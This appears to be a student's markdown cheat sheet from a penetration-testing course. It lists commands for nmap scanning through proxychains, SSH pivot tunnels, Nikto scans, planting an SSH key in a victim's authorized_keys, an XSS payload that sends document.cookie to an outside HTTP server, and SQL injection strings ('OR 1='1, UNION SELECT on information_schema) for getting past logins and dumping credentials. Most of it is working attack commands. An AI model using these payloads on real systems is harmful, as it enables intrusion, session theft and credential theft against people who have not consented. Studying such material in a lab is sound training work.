# Commands

## Scraping Data
- Prep
```pip install lxml requests```
- Script
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
- What will it output?
```
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']
```

## proxychains nmap scripts
```
proxychains nmap -T5 --script=banner <ip>
proxychains nmap -T5 --script=http-enum <ip>
proxychains nmap -T5 --script=http-enum.nse <ip>
```

## finding a script
```
ls -l /usr/share/nmap/scripts | grep "something"
```

## TCPdump
sudo tcpdump -XXvvnni any tcp port 80


# Tunnels

## Setting up the connection
- set up connection to jump box
```
ssh -MS /tmp/jump student@10.50.35.126
```
- the /tmp/jump file is a socket

## Scanning IPs
- scan ips
```
for i in {1..254};do (ping -c 1 192.168.28.$i 2>/dev/null | grep "bytes from" &) ;done
```

## Dynamic tunnel
- now we need to set up the dynamic
```
ssh -S /tmp/jump jump -O forward -D9050
```
## Port Scans
- scan ports
```
proxychains nmap 192.168.28.97,98,100,105
```

## How to cancel the Port Forward
- Cancel your port forward
```
cntrl r <type part of command>
# change forward to cancel
ssh -S /tmp/jump jump -O cancel -D9050
```
## Forwarding to multiple ports at one time
- multiple forward to those vuln ports
```
ssh -S /tmp/jump jump -O forward -L2222:192.168.28.100:80 -L3333:192.168.28.100:2222
```
- you can forward to multiple ips

## Opening websites through the forward
- we can access the website via firefox on our lin-ops workstations 
```
firefox
```
- enter the loopback and the port 127.0.0.1:2222
## Tunneling to another device
- gonna use the shit out of this to authenticate to new system
```
ssh -MS /tmp/t1 creds@127.0.0.1 -p 3333
```
## Forwarding through the new tunnel
- theoretically after you scan the new net you find 192.168.50.10,20,30 - port 22
```
ssh -S /tmp/t1 t1 -O forward -L6666:192.168.50.10:22 -L7777:192.168.50.20:22
```
## Stepping through the tunnel
- making next step to tunnel
```
ssh -MS /tmp/t2 creds@127.0.0.1 -p 6666
```

## Website enumeration
```
--script=http-enum
```
## Nikto
```
nikto v -h <IP address>
```
> use with TCPdump.

## website exploitation commands
```
mkdir /var/www/directory/.ssh
cat ~/.ssh/id_rsa.pub
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
cat /users/home/directory/.ssh/authorized_keys
```
## ssh with keys
```
ssh -i .ssh/id_rsa -MS /tmp/demo www-data@10.50.28.11
```
## making your own HTTP server 
```
python3 -m http.server
```
> default port 8000

## XSS check
```
<script>alert('XSS');</script>
```
## Other XSS useful command
```
<script>document.location="http://10.50.30.229:8000/?username=student" + document.cookie;</script>
```

# SQL Commands

## Commands for demo
```
mysql    # shows information regarding the server
help    # shows help
show databases ;    # shows what databases you can access. if you forget the semicolon if will not work.
```
### Default Databases
- information_schema    # contains information regarding all other databases
- mysql                 #
- performance_schema    #
```
show tables
```
### big three
- database
- table
- columns
```
show columns from columns ;
```
### Three golen nuggets
- table schema
- table name
- column name
### The Golden statement
```
select table_schema, table_name, column_name from information_schema.columns
```
### selecting multiple fields
```
select username, passwd, studentID from session.userinfo ;
select carid, type from session.cars ;
```

## SQL injection
```
'OR 1='1      #truth statement added to logins to get authentication
Audi 'UNION SELECT 1,2,3,4 #
Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #

```
### Steps for creds
- 1. input your true bool statement in both fields
- 2. observe the get request with dev tool
- 3. paste the get request into the html bar with a ? before to query it
- 4. observe creds


### steps for fuzzzy/spitballing
- 1. Identify the vuln field      # ford 'OR 1='1
- 2. Identify how many columns    # Audi 'UNION SELECT 1,2,3,4 #
- 3. Edit the golden statement    # build your golden statement to print every column with placeholders in the columns that are mising.
















